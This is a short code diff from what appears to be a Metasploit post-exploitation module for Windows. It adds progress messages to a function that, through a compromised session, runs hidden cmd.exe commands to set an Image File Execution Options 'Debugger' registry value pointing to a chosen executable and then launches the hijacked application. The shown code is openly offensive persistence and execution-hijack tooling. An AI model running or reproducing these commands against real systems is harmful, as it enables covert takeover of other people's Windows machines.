@@ -173,7 +173,10 @@ def hijack_funtion
       #
       r = session.sys.process.execute("cmd.exe /c \"#{regi_make}\" /v Debugger /t REG_SZ /d \"#{executable}\" /f", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(2.0)
+      print_good(" exec => start #{exec_hijack} application ..")
       r = session.sys.process.execute("cmd.exe /c start \"#{exec_hijack}\"", nil, {'Hidden' => true, 'Channelized' => true})
+      Rex::sleep(1.0)
+      print_status("Hijack completed successefully ..")
       r.channel.close
       r.close
     else
